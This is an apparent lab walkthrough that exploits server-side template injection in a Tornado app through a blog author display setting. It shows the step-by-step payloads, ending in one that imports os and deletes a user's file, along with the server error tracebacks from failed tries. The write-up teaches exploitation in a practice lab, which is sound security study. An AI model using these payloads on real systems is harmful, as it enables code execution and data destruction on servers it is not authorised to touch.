# Detailed Walkthrough

Go to My account, log in using provided credentials.

Click on drop down with Preferred name, choose any of listed values (Name, First Name, Nickname) and click Submit.

See POST request `/my-account/change-blog-post-author-display` with `blog-post-author-display=` and csrf token. Looks like when post page loads it executes Tornado.template with `blog-post-author-display` expression.

So we need to:

1. Change and save the template by sending POST request `/my-account/change-blog-post-author-display` with `blog-post-author-display=` and csrf token.
2. Paste the comment on the random post.
3. Visit this post page being authenticated to make engine render malicious code stored in the changed template on the server.

Send (save) payload `user.nickname}}{{7*7` so the full body is `blog-post-author-display=user.nickname}}{{7*7&csrf=yNs1503uxEcNJMMovzcp0E4UI6Vd42bv`. Visit the page. Observe that no template execution takes place. Probably it returns results only for one template tag.

![image.png](Detailed%20Walkthrough/image.png)

If we send payload `7*7` so the full body is `blog-post-author-display=7*7&csrf=yNs1503uxEcNJMMovzcp0E4UI6Vd42bv`. Now we can see 7*7 reflected on the page.

![image.png](Detailed%20Walkthrough/image%201.png)

Trying to execute remove file `user.nickname}}{{os.remove("/home/carlos/morale.txt")`

See the error:

```jsx
Internal Server Error
Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 9, in _tt_execute NameError: global name 'os' is not defined
```

Execute `user.nickname}}{{import+os;os.remove("/home/carlos/morale.txt")`

See the error:

```jsx
Internal Server Error
No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 9 _tt_tmp = import os;os.remove("/home/carlos/morale.txt") # <string>:1 ^ SyntaxError: invalid syntax
```

We have an issue with executing import because of two reasons:

**Why {{ os.some_command }} fails?**

In Tornado templates:

- {{ ... }} is expression-only
- Expressions are evaluated against the template namespace
- That namespace does not automatically include Python globals

So unless `os` is explicitly injected into the template context, it does not exist.

**Why {{ import os }} fails?**

This fails cause import is a statement, not an expression.

Tornado has two distinct constructs, similar to ERB or Jinja:

Execute statements: `{% ... %}`
Output expressions: `{{ ... }}` 

So we need to change the tag around `import os` .

Now execute expression to delete Carlos file as it expected: `user.nickname}}{%import+os%}{{os.remove("/home/carlos/morale.txt")` (or full encoded body `blog-post-author-display=user.nickname}}{%import+os%}{{os.remove("/home/carlos/morale.txt")&csrf=yNs1503uxEcNJMMovzcp0E4UI6Vd42bv`). See Lab solved.

We still have an error `OSError: [Errno 2] No such file or directory: '/home/carlos/morale.txt'` because the template executes at least three times since we have 3 comments, but the first we hit success.